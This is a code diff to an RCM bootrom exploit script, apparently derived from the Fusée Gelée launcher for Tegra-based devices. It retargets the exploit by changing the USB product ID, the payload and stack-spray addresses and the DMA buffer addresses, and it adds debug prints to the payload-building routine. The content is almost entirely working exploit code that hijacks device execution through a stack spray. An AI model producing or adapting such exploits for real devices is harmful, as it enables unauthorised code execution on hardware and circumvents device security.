@@ -42,15 +42,15 @@ RCM_HEADER_SIZE = 644
 
 # The address where the RCM payload is placed.
 # This is fixed for most device.
-RCM_PAYLOAD_ADDR    = 0x4000F000
+RCM_PAYLOAD_ADDR    = 0x4000a000
 
 # The address where the user payload is expected to begin.
-PAYLOAD_START_ADDR  = 0x4000FE40
+PAYLOAD_START_ADDR  = 0x4000aE40
 
 # Specify the range of addresses where we should inject our
 # payload address.
-STACK_SPRAY_START   = 0x40013E40
-STACK_SPRAY_END     = 0x40016000
+STACK_SPRAY_START   = 0x4000fE40
+STACK_SPRAY_END     = 0x40012000
 
 # notes:
 # GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
@@ -454,11 +454,11 @@ class RCMHax:
 
     # Default to the Nintendo Switch RCM VID and PID.
     DEFAULT_VID = 0x0955
-    DEFAULT_PID = 0x7f13
+    DEFAULT_PID = 0x7330
 
     # Exploit specifics
-    COPY_BUFFER_ADDRESSES   = [0x40004000, 0x40008000]   # The addresses of the DMA buffers we can trigger a copy _from_.
-    STACK_END               = 0x4000f000                 # The address just after the end of the device's stack.
+    COPY_BUFFER_ADDRESSES   = [0x40003000, 0x40005000]   # The addresses of the DMA buffers we can trigger a copy _from_.
+    STACK_END               = 0x4000a000                 # The address just after the end of the device's stack.
 
     def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
         """ Set up our RCM hack connection."""
@@ -679,12 +679,14 @@ print("Payload offset of user payload first part: 0x{:08x}".format(len(payload))
 
 # Fit a collection of the payload before the stack spray...
 padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
+print("Padding size: 0x{:08x}".format(padding_size))
 payload += target_payload[:padding_size]
 
 print("Payload offset of stack spray: 0x{:08x}".format(len(payload)))
 
 # ... insert the stack spray...
 repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
+print("injecting {} copies of payload address".format(repeat_count))
 payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
 
 print("Payload offset user payload second part 0x{:08x}".format(len(payload)))
